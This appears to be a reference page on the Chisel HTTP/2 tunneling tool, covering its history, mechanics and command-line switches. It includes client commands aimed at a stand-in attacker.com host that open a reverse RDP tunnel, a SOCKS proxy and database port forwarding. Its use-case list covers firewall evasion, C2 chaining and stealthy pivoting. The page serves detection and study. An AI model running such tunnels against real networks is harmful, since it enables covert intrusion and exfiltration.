🔴 **RED FLAG:** Chisel wraps TCP/UDP traffic over HTTP/2-over-TLS, making tunnel setup indistinguishable from HTTPS traffic to packet inspection; it runs as a single Go binary with no dependencies, making deployment invisible to package-management auditing and trivial to rename/rehost.

## History

**Chisel** is an open-source tunneling tool written in pure Go by [jpillora](https://github.com/jpillora) (Jaime Pillora), first released in 2017 and actively maintained. The project lives at **[github.com/jpillora/chisel](https://github.com/jpillora/chisel)** with current version **v1.11.8** (released 2026-07-10).

Chisel was designed to tunnel traffic through restrictive firewalls by disguising tunneling as standard HTTPS traffic. Unlike earlier SSH-based tunneling tools, Chisel relies on HTTP/2 protocol multiplexing, allowing multiple logical tunnels over a single TCP connection.

Licensed under MIT.

## Key Mechanics

- **Transport:** HTTP/2 over TLS (auto-generated self-signed cert by default)
- **Architecture:** Server listens for client connections; clients establish outbound tunnel
- **Multiplexing:** Single HTTP/2 connection carries multiple logical tunnels (streams)
- **Port forwarding:** `-L local:remote` and `-R remote:local` flags configure endpoints
- **SOCKS5:** Server can expose SOCKS5 proxy endpoint
- **Keepalive:** Auto-reconnect with exponential backoff on disconnection

## Command-Line Switches — Quick Reference

**Server:**
```
chisel server -p 8080                    # Listen on port 8080
chisel server -a user:pass               # Require authentication
chisel server --backend http://example.com # Proxy non-tunnel traffic
```

**Client:**
```
chisel client https://attacker.com:8080 -L 3000:localhost:3306
chisel client https://attacker.com:8080 -D 1080
chisel client https://attacker.com:8080 -R 8888:localhost:3389
```

## Quick Use-Case List

1. Local port forwarding (database access)
2. Multi-hop forwarding (multiple services)
3. Reverse tunnel (callback from internal host)
4. SOCKS5 proxy (for nmap, curl, proxychains)
5. SSH ProxyCommand integration
6. Chained with C2 (Sliver/Cobalt Strike)
7. Credential-protected tunnel (server -a)
8. TLS certificate customization
9. Egress-filtering evasion (HTTP/2-over-HTTPS)
10. Bandwidth throttling (long-term stealth)
11. Dynamic route exposure (multi-stage pivoting)
12. Auto-reconnection (survives network disruption)

## Prerequisites

**Server:** Network reachability from clients, listening port open (8080 default), no special privileges required

**Client:** Outbound HTTPS access to server, no elevated privileges required

**Chaining:** If used with C2 or SOCKS consumers, those must already be running
